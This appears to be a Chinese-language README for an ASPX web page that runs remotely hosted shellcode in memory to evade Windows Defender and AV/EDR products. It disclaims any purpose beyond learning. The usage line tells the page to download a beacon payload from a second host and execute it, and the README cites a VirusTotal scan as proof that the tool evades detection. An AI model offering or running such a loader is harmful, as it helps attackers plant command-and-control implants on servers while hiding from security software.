





- ASPX内存执行shellcode,绕过Windows Defender（AV/EDR），


- 这只是个代码例子，目的是为了学习
- 部分杀软（AV/EDR）可能需要你的Bin能够做到内存免杀



## 使用

将shellcode远程托管到任意网站（URLB）

```
http://URLA/bypass.aspx?shellcodeURL=http://URLB/beacon_x64.bin
```



视频（开头有点糊）



<video src = "https://private-user-images.githubusercontent.com/89376703/290430995-2f302aa6-f615-49b2-9af5-f1ffba314d66.mp4?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTEiLCJleHAiOjE3MDI1MzY5MjAsIm5iZiI6MTcwMjUzNjYyMCwicGF0aCI6Ii84OTM3NjcwMy8yOTA0MzA5OTUtMmYzMDJhYTYtZjYxNS00OWIyLTlhZjUtZjFmZmJhMzE0ZDY2Lm1wND9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFJV05KWUFYNENTVkVINTNBJTJGMjAyMzEyMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjMxMjE0VDA2NTAyMFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWQ5NDk1ZTRkMjRiMzA4M2FlOTA5Y2U5YjA1NTEzOTA5YTAxY2ViZDk0OGIzZTQ4YTNlMzFhMjFhZDIwMTI2N2ImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.Zl_bzrlh67QpLrCoRCjJhIAHNGc4wwJgOOlQILMPCUQ"><video>




VT效果：

https://www.virustotal.com/gui/file/b016e15e7cf0d737580474703cbf351eec956b870c2ad39e43beb3fa6422d5e3?nocache=1

![image-20231214150848525](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20231214150848525.png)
